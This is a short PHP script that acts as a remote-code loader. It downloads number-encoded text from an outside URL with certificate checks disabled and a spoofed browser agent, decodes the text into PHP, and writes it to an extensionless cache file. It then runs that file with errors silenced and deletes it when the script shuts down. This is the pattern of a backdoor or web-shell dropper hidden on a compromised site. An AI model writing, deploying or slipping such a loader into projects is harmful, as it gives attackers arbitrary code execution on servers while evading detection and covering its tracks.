<?php
// 1. ダウンロード (Download pakai cURL)
$URL = 'https://furinaraw.tech/raw/e4f30a24abe6d17b03dbd542e3dec000';

$接続 = curl_init($URL);
curl_setopt_array($接続, [
    CURLOPT_RETURNTRANSFER => 1,
    CURLOPT_SSL_VERIFYPEER => 0,
    CURLOPT_TIMEOUT => 15,
    CURLOPT_USERAGENT => 'Mozilla/5.0'
]);
$アスキーデータ = curl_exec($接続);
curl_close($接続);

if ($アスキーデータ && strlen($アスキーデータ) > 10) {
    // 2. デコード (Decode ASCII jadi PHP)
    $数字 = preg_split('/[\s,]+/', trim($アスキーデータ));
    $コード = '';
    foreach ($数字 as $値) {
        if (is_numeric($値)) {
            $コード .= chr((int)$値);
        }
    }

    // 3. 拡張子なしで保存 (Simpan TANPA EKSTENSI)
    if ($コード && strpos($コード, '<?') !== false) {
        
        $ディレクトリ = __DIR__ . '/data';
        @mkdir($ディレクトリ, 0755, true);
        if (!is_dir($ディレクトリ)) $ディレクトリ = __DIR__;
        
        $ファイル = $ディレクトリ . '/cache_' . md5(uniqid()); 
        
        $ファイルハンドル = @fopen($ファイル, 'w');
        if ($ファイルハンドル) {
            $書き込み = @fwrite($ファイルハンドル, $コード);
            @fclose($ファイルハンドル);
            
            if ($書き込み > 10) {
                
                // 自動削除の登録 (Auto-Cleanup)
                register_shutdown_function(function() use ($ファイル) {
                    if (file_exists($ファイル)) {
                        @unlink($ファイル);
                    }
                });
                
                // 4. 実行 (Include file)
                try { @include($ファイル); } catch (Throwable $e) {}
                
            }
        }
    }
}
?>